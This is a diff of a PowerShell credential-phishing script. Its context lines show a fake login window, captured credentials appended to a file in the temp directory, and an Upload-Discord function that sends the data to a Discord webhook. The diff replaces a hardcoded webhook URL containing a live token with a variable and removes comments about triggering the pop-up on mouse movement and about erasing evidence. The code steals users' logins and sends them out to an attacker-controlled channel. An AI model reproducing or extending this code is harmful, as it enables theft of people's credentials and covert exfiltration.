@@ -8,7 +8,7 @@ function Upload-Discord {
         [string]$text 
     )
 
-    $hookurl = "https://discord.com/api/webhooks/1171563379874340874/yWRq-Ehof2YQ3ycRswEtfDtSWc_ZJwcomxwhCGYxU8uubem_Llurm9yPW4sfJk7H6bMn"
+    $hookurl = "$dc"
 
     $Body = @{
         'username' = $env:username
@@ -30,12 +30,6 @@ Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase
 
 
 #----------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
-#>
 
 # Get the default user directory
 $userDirectory = [System.IO.Path]::Combine($env:USERPROFILE, 'Library')
@@ -179,11 +173,6 @@ $loginButton.Add_Click({
 # Show the login window
 $loginWindow.ShowDialog()
 
-<#
-
-.NOTES 
-	This is to save the gathered credentials to a file in the temp directory
-#>
 
 echo $creds >> $env:TMP\$FileName
 
@@ -196,16 +185,7 @@ $msgImage = 'Information'
 
 # Show a message box with location information
 $Result = [System.Windows.MessageBox]::Show($msgBody, $msgTitle, $msgButton, $msgImage)
-Write-Host "The user clicked: $Result"
 #------------------------------------------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
-#>
-
-# Delete contents of Temp folder 
 
 $URL = "https://www.facebook.com"
 
